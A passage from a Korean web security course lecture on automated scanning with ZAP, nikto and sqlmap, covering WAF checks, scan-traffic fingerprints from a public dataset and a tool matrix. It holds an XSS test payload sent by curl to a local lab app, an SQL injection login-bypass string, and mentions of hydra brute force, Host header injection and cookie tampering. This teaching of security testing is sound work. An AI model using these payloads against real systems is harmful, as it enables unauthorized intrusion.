curl -sI "http://localhost:3000/rest/products/search?q=<script>alert(1)</script>" | head -3

# 2. Apache+ModSecurity WAF 시그니처 확인
echo "---"
echo "=== Apache+ModSecurity 응답 헤더 ==="
curl -sI http://localhost:3000/ | grep -iE "server|x-apache2|modsecurity|x-waf"
ENDSSH
```

---

## 핵심 정리

1. OWASP ZAP, nikto, sqlmap은 취약점 자동 점검의 핵심 도구다
2. 자동 도구는 넓은 범위를 빠르게 점검하지만 로직 취약점은 놓친다
3. 오탐 판별은 응답 변화, 시간 차이, 에러 메시지를 기준으로 한다
4. Nuclei 스타일 템플릿으로 반복 가능한 점검을 구성할 수 있다
5. WAF가 있어도 우회 가능성을 항상 점검해야 한다
6. 자동 스캔 + 수동 검증의 조합이 최선의 점검 방법이다

---

## 다음 주 예고
- Week 14: 취약점 점검 보고서 작성법 - CVSS 점수, 재현 절차, 권고사항

---

> **실습 환경 검증 완료** (2026-03-28): nmap/nikto, SQLi/IDOR/swagger.json, CVSS, 보고서 작성

---

## 📂 실습 참조 파일 가이드

> 이번 주 실습에서 **실제로 조작하는** 솔루션의 기능·경로·파일·설정·UI 요점입니다.

### OWASP ZAP
> **역할:** 오픈소스 자동 웹 취약점 스캐너·프록시  
> **실행 위치:** `작업 PC / Docker`  
> **접속/호출:** GUI `zaproxy`, API `http://zap:8090/JSON/...`, Docker `owasp/zap2docker-stable`

**주요 경로·파일**

| 경로 | 역할 |
|------|------|
| `~/.ZAP/session-*` | 세션 저장소 |
| `context.xml` | 스캔 컨텍스트(범위/인증) |

**핵심 설정·키**

- `Active Scan policy` — 룰별 강도 및 활성화 여부
- `Authentication: form-based` — 로그인이 필요한 페이지 스캔

**로그·확인 명령**

- `~/.ZAP/zap.log` — 스캐너 실행 로그

**UI / CLI 요점**

- Spider — 링크 탐색 크롤링
- Active Scan — 실제 페이로드 주입 점검
- Report → Generate HTML report — 표준 보고서 출력

> **해석 팁.** 인증 필요 페이지는 **Context에 로그인 폼**을 등록하지 않으면 로그아웃 상태로 스캔되어 커버리지가 급감. `zap-baseline.py`는 수동 확인용 경량 모드.

---

## 실제 사례 (WitFoo Precinct 6 — 자동화 도구 트래픽 지문)

> 출처: WitFoo Precinct 6 Cybersecurity Dataset (Apache 2.0)
> 본 lecture *자동화 점검 도구 활용* 학습 항목 (nikto·ZAP·Burp 자동 스캔 trace) 과 매핑되는 *동일 src 가 단일 timestamp 에 burst* 패턴 record.

### Case 1: src `100.64.20.230` — 1초 내 30 host × 54 port × 208 events

(앞서 w03 정찰 lecture 와 동일 record — 본 lecture 에선 *자동화 도구의 출력물* 관점에서 재해석)

**해당 record 의 *자동화 도구 추정* 근거**

| 자동화 추정 단서 | 본 record 의 증거 |
|------------------|-----------------|
| 동일 timestamp | 모든 208 events 가 `1688960026` (1초) — *사람 손 불가능* |
| 포트 다양성 (54) | 22·88·1433·5060·5632·8333·9418·31337 등 — nmap 의 `--top-ports 100` 와 유사한 *알려진 서비스 포트 묶음* |
| host sweep 패턴 | 30개 dst IP 가 *연속 /24 대역* 분포 — masscan / nmap `-sn` 패턴 |
| outcome 균일 (block/warning) | 차단 응답이 모두 동일 → *공격 도구가 응답 분류로 host 존재 여부 판정* |

### Case 2: 4018건 GET (단일 src `100.64.1.37`) — *정상* 자동화 (proxy)

**비교 의미**: 자동화 트래픽은 *공격* 만 만드는 게 아님 — 정상 GoogleImageProxy 도 동일한 *burst + 단일 UA* 지문을 가짐. 점검 도구 출력물도 이와 구분 어려움.

**해석 — 본 lecture 와의 매핑**

| 자동화 도구 점검 항목 | 본 record 의 시사점 |
|---------------------|---------------------|
| **도구 출력물 분석** | nikto/ZAP 보고서를 *위 두 record 와 비교* — 본인 도구 출력의 *지문 회피도* 평가 |
| **점검 도구 결과 → SIEM 연동** | 본 dataset 처럼 CEF/JSON 표준 출력 사용 시 SIEM 자동 통합 가능. 자체 점검 도구도 동일 표준 출력 권장 |
| **결과 통합 (False Positive 분리)** | 정상 (GoogleImageProxy) 과 공격 (recon scan) 모두 burst — 점검 도구는 *통계적 분리* (UA·payload·outcome) 로 FP 제거 |
| **재현성 보장** | 자동화 도구 결과는 *같은 input → 같은 output* — 본 record 처럼 timestamp 보존하면 재현 가능 |

**점검 액션**:
1. 본인 점검 도구 (Burp/ZAP) 의 출력 형식이 CEF/JSON 표준 따르는지 확인 → 안 따르면 변환 plugin 사용
2. 동일 점검 시나리오를 *2회 실행* 하여 결과 일치도 측정 (재현성 확보)
3. 점검 결과의 *false positive 비율* 측정 (정상 트래픽도 일부 alert 발생) → 임계값 조정



---

## 부록: 학습 OSS 도구 매트릭스 (lab week13 — 인증/세션)

| step | 카테고리 | 핵심 도구 |
|---|---|---|
| 1 SQLi 우회 | `admin'--` / sqlmap --forms / PayloadsAllTheThings Auth_Bypass |
| 2 hydra brute | **hydra http-post-form** / wfuzz / **Burp Cluster Bomb** / patator |
| 3 curl 수동 | bash for-loop / Python requests threading / 응답 차이 |
| 4 쿠키 속성 | curl -I / DevTools / Burp / 보안 속성 표 |
| 5 Session Fixation | curl 4 단계 / Burp Repeater / OWASP ZAP rule |
| 6 Password Reset | 8 패턴 / **Host header injection** / sqlmap |
| 7 쿠키 변조 | curl -b / Burp Match and Replace / **EditThisCookie** |
| 8 인증 검증 | curl /whoami / pyjwt decode / Burp |
| 9 reporting | Burp Sequencer / NIST SP 800-63B / DefectDojo / sha256 |

(week06 의 종합 인증/세션 매트릭스 참조)
